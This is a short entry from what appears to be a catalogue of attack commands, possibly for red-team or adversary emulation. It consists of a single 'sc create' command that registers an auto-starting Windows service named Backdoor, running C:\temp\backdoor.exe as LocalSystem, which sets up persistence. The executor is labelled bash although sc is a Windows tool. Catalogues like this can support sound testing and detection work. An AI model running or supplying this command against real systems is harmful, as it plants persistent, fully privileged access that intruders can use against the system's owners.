---
id: 2d4d3683-2dc3-40ba-a03b-54c084b5ccf4
name: Create Backdoor Service using sc
type: command
executor: bash
data: sc create Backdoor binpath= "cmd.exe /k C:\temp\backdoor.exe" start="auto" obj="LocalSystem"
output: null
created_at: '2023-04-06T03:56:28.095382+00:00'
updated_at: '2023-04-10T20:37:29.727924+00:00'
---

# Create Backdoor Service using sc

```bash
sc create Backdoor binpath= "cmd.exe /k C:\temp\backdoor.exe" start="auto" obj="LocalSystem"
```
